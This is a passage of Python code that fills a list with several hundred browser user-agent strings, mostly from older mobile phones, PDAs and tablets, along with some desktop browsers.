    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.800) AppleWebKit/534.6 (KHTML, like Gecko) Version/5.0 Safari/534.6.3")
    headers.append("DoCoMo/1.0/P502i/c10 (Google CHTML Proxy/1.0)")
    headers.append("DoCoMo/2.0 SH901iC(c100;TB;W24H12)")
    headers.append("DoCoMo/1.0/N503is/c10")
    headers.append("KDDI-KC31 UP.Browser/6.2.0.5 (GUI) MMP/2.0")
    headers.append("UP.Browser/3.04-TS14 UP.Link/3.4.4")
    headers.append("Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1")
    headers.append("J-PHONE/5.0/V801SA/SN123456789012345 SA/0001JP Profile/MIDP-1.0")
    headers.append("Mozilla/3.0(DDIPOCKET;JRC/AH-J3001V,AH-J3002V/1.0/0100/c50)CNF/2.0")
    headers.append("PDXGW/1.0 (TX=8;TY=6;GX=96;GY=64;C=G2;G=B2;GI=0)")
    headers.append("ASTEL/1.0/J-0511.00/c10/smel")
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.5; en-gb; HTC Desire HD A9191 Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/2.0 (compatible; MSIE 3.02; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020")
    headers.append("Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016")
    headers.append("OPWV-SDK UP.Browser/7.0.2.3.119 (GUI) MMP/2.0 Push/PO")
    headers.append("UP.Browser/6.1.0.1.140 (Google CHTML Proxy/1.0)")
    headers.append("Mozilla/4.0 (compatible; MSIE 5.0; PalmOS) PLink 2.56b")
    headers.append("Mozilla/5.0 (PDA; NF35WMPRO/1.0; like Gecko) NetFront/3.5")
    headers.append("Mozilla/4.08 (Windows; Mobile Content Viewer/1.0) NetFront/3.2")
    headers.append("Mozilla/4.0 (PS2; PlayStation BB Navigator 1.0) NetFront/3.0")
    headers.append("Mozilla/4.0 (PDA; PalmOS/sony/model crdb/Revision:1.1.36(de)) NetFront/3.0")
    headers.append("Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0")
    headers.append("Mozilla/4.0 (PDA; Windows CE/0.9.3) NetFront/3.0")
    headers.append("Mozilla/4.0 (PDA; Windows CE/1.0.1) NetFront/3.0")
    headers.append("Mozilla/4.0 (PDA; SL-C750/1.0,Embedix/Qtopia/1.3.0) NetFront/3.0 	Zaurus C750")
    headers.append("WM5 PIE")
    headers.append("Xiino/1.0.9E [en] (v. 4.1; 153x130; g4)")
    headers.append("Mozilla/5.0 (Linux; U; Android 3.2.1; en-gb; A501 Build/HTK55D) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")
    headers.append("Opera/9.80 (Android 3.2.1; Linux; Opera Tablet/ADR-1205181138; U; en-GB) Presto/2.10.254 Version/12.00")
    headers.append("Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0")
    headers.append("Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0")
    headers.append("Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0; MAAR; .NET4.0C)")
    headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19")
    headers.append("Mozilla/5.0 (Linux; Android 4.1.1; Transformer Prime TF201 Build/JRO03C) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166  Safari/535.19")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; Transformer TF101 Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; VS840 4G Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.1; en-us; MB525 Build/3.4.2-107_JDN-9) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1-update1-1.0.19; en-us; NXM736 Build/ECLAIR) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; de-de; U0101HA Build/FRF85B) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.1; de-de; SP-60 Build/MASTER) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-gb; ViewPad7 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1-2010.11.4; de-de; XST2 Build/ECLAIR) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17")
    headers.append("Mozilla/5.0 (Linux; U; Android 1.0.3; de-de; A80KSC Build/ECLAIR) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.1; en-au; eeepc Build/MASTER) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 1.6; en-us; xpndr_ihome Build/DRD35) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.1; fr-ch; A43 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.1; de-de; X2 Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_1_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) CriOS/25.0.1364.124 Mobile/10B146 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_1_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B147 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9B206")
    headers.append("Mozilla/5.0 (iPod; CPU iPhone OS 5_1_1 like Mac OS X; nl-nl) AppleWebKit/534.46.0 (KHTML, like Gecko) CriOS/21.0.1180.80 Mobile/9B206 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3")
    headers.append("iTunes/9.1.1")
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F191 Safari/6533.18.5")
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5")
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5")
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10")
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_2 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7D11 Safari/528.16")
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16")
    headers.append("Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3")
    headers.append("Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)")
    headers.append("BenQ-CF61/1.00/WAP2.0/MIDP2.0/CLDC1.0 UP.Browser/6.3.0.4.c.1.102 (GUI) MMP/2.0")
    headers.append("MAUI WAP Browser")
    headers.append("Mozilla/5.0 (BB10; &amp;lt;Device Model>) AppleWebKit/&amp;lt;WebKit Version> (KHTML, like Gecko) Version/&amp;lt;BB Version #> Mobile Safari/&amp;lt;WebKit Version>")
    headers.append("Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.0.1; en-US) AppleWebKit/535.8+ (KHTML, like Gecko) Version/7.2.0.1 Safari/535.8+")
    headers.append("Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.0.0; en-US) AppleWebKit/535.8+ (KHTML, like Gecko) Version/7.2.0.0 Safari/535.8+")
    headers.append("Mozilla/5.0 (PlayBook; U; RIM Tablet OS 1.0.0; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.7 Safari/534.11+")
    headers.append("Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+")
    headers.append("Mozilla/5.0 (BlackBerry; U; BlackBerry 9860; en-GB) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.296 Mobile Safari/534.11+")
    headers.append("Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; fr) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.570 Mobile Safari/534.8+")
    headers.append("Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.600 Mobile Safari/534.8+")
    headers.append("Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+")
    headers.append("Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+(KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1+")
    headers.append("Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/530.17 (KHTML, like Gecko) Version/6.0.0.62 Mobile Safari/530.17")
    headers.append("BlackBerry9650/5.0.0.732 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/105")
    headers.append("BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123")
    headers.append("BlackBerry9630/4.7.1.40 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105")
    headers.append("BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102")
    headers.append("BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105")
    headers.append("BlackBerry8830/4.2.2 Profile/MIDP-2.0 Configuration/CLOC-1.1 VendorID/105")
    headers.append("BlackBerry8820/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102")
    headers.append("BlackBerry8703e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105")
    headers.append("BlackBerry8320/4.5.0.188 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100")
    headers.append("BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/106")
    headers.append("BlackBerry8320/4.3.1 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("BlackBerry8110/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/118")
    headers.append("Opera/9.50 (J2ME/MIDP; Opera Mini/4.0.10031/298; U; en)")
    headers.append("BlackBerry8130/4.5.0.89 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/106")
    headers.append("BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103")
    headers.append("BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104")
    headers.append("BlackBerry7250/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows NT) (compatible; MSIE 5.5; Windows NT)")
    headers.append("Cricket-A310/1.0 UP.Browser/6.3.0.7 (GUI) MMP/2.0")
    headers.append("Cricket-A410/1.0 Polaris/v6.17")
    headers.append("Cricket-A200/1.0 UP.Browser/6.3.0.7 (GUI) MMP/2.0")
    headers.append("Mozilla/5.0 (en-us) AppleWebKit/525.13 (KHTML, like Gecko; Google Wireless Transcoder) Version/3.1 Safari/525.13 T")
    headers.append("Cricket-A200/1.0 UP.Browser/6.3.0.7 (GUI) MMP/2.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; DELL; Venue Pro)")
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/ 3.1.2 Safari/525.20.1")
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5G77 Safari/525.20")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.1.1; he-il; Nexus 7 Build/JRO03D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; Nexus S Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus One Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17")
    headers.append("Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.2; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.40.1 Safari/534.6 TouchPad/1.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; HP iPAQ h6300)")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Sensation_Z710e Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; ADR6300 Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; en-us; ADR6200 Build/CUPCAKE) AppleWebKit/528.5+(KHTML, like Gecko) Version/3.1.2")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.4; es-mx; HTC_One_X Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0")
    headers.append("HTC_Touch_HD_T8282 Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)")
    headers.append("Mozilla/4.0 (compatible: MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; HTC; 7 Trophy)")
    headers.append("Mozilla/4.0 (compatible: MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; HTC; 7 Trophy)")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile G2 Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.3; pl-pl; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; HTC; HD7)")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 1.6; en-us; WOWMobile myTouch 3G Build/unknown) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1")
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; HTC; 7 Mozart; Orange)")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Windows Phone 6.5.3.5)")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.6) PPC; MDA Vario/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("HTC_HD2_T8585 Opera/9.7 (Windows NT 5.1; U; en)")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; nl-nl; Desire_A8181 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1-update1; en-us; ADR6300 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; HTC_Touch_Diamond2_T5353; Windows Phone 6.5)")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 8.12; MSIEMobile 6.0) USCCHTC6875")
    headers.append("XV6850 Opera/9.50 (Windows NT 5.1; U; en)")
    headers.append("Modzilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11) 480x640; XV6850; Window Mobile 6.1 Professional;")
    headers.append("HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Windows Phone 6.5) UP.Link/6.3.1.17.0")
    headers.append("htc_touch_pro2_t7373 opera/9.50 (windows nt 5.1; u; de)")
    headers.append("HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1")
    headers.append("HTC-P4600/1.2 Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11) UP.Link/6.3.1.17.0")
    headers.append("HTC_Touch_Pro_T7272 Opera/9.50 (Windows NT 5.1; U; en)")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.6; en-gb; U8815 Build/HuaweiU8815C02B895) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Version/4.0 Kindle/3.0 (screen 600x800; rotate)")
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us; Silk/1.1.0-84) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Silk-Accelerated=true")
    headers.append("Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko,")
    headers.append("Safari/528.5+) Version/4.0 Kindle/3.0 (screen 600X800; rotate)")
    headers.append("Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; IdeaTab A2107A-H Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30")
    headers.append("LGE-LG290C/1.0[TF268435459307028557000000012602392946] UP.Browser/6.2.3.8 (GUI) MMP/2.0")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.2; en-us; VM670 Build/FRG83G) AppleWebKit/533.1 (KHTML, like Gecko)")
    headers.append("LG-LG260 POLARIS-LG260/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("LGE-LG290C/1.0[TF268435459307087980000000012298546358] UP.Browser/6.2.3.8 (GUI) MMP/2.0")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.2; en-us; VS910 4G Build/VS910ZV6) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.2; en-us; VS910 4G Build/VS910ZV6) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; LG-VM670 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.1; en-us; LG-MS690 Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("LG-GT400/v10a Browser/Teleca-Q7.1 MMS/LG-MMS-V1.0/1.2 MediaPlayer/LGPlayer/1.0 Java/ASVM/1.1 Profile/MIDP-2.1 Configuration/CLDC-1.1")
    headers.append("LG-GS290/V100 Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.1; de-de; LG-P350 Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 MMS/LG-Android-MMS-V1.0/1.2")
    headers.append("LGE-VM510 NetFront/3.5.1 (GUI) MMP/2.0")
    headers.append("LG/KU990i/v10a Browser/Obigo-Q05A/3.6 MMS/LG-MMS-V1.0/1.2 Java/ASVM/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("LG-CT810/V10x IEMobile/7.11 Profile/MIDP-2.0 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)")
    headers.append("POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1")
    headers.append("Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 240X400 LGE VX9700")
    headers.append("LGE-MX380/1.0 UP.Browser/6.2.3.9 (GUI) MMP/2.0")
    headers.append("Mozilla/4.1 (compatible; MSIE 6.0; ) 400x240 LGE VX10000")
    headers.append("LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("MOT-EX431G/[TF359486041364033384919913852428475] Obigo/Q03C MMP/2.0")
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; en-us; MB501 Build/CUPCAKE) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1")
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Windows Phone 6.5.3.5)")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2.1; fr-ca; Milestone Build/ SHOLS_U2_05.26.1) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0C)")
    headers.append("Mozilla/5.0 (Linux; U; Android 3.0.1; de-de; MZ601 Build/H.6.1-38-5) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; DROID2 Build/VZW) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 480X854 motorola DROID2")
    headers.append("Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; Xoom Build/HWI69) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")
    headers.append("Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; DROID2 GLOBAL Build/S273) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1-update1; en-us; DROIDX Build/VZW) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17 480X854 motorola DROIDX")
    headers.append("MOT-COOL0/00.62 UP.Browser/6.2.3.4.c.1.128 (GUI) MMP/2.0")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1-update1; en-us; Droid Build/ESE81) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/ 530.17")
    headers.append("MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0")
    headers.append("MOT 24.1 _/00.62 UP.Browser/6.2.3.4.c.1.120 (GUI) MMP/2.0")
    headers.append("MOT-L6/0A.52.45R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("MOT-V3r/08.BD.43R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("MOT-V3i/08.B4.34R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0")
    headers.append("MOT-A-1C/01.01 UP.Browser/7.0.0.2.c.1.104 (GUI) MMP/2.0 UP.Link/5.1.2.16")
    headers.append("MOT-V620/0E.65.25R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Link/6.3.1.12.0")
    headers.append("MOT-V600/0B.09.38R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0")
    headers.append("MOT-E398/0E.20.97R MIB/2.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1")
    headers.append("mot-V3/OE.40.79R MIB/2.2.1 profile/MIDP-2.0 configuration/CLDC-1.0 UP.Link/6.2.3.15.0")
    headers.append("Mozilla/2.0 (compatible; MSIE 3.02; Windows CE; Smartphone; 176x220)")
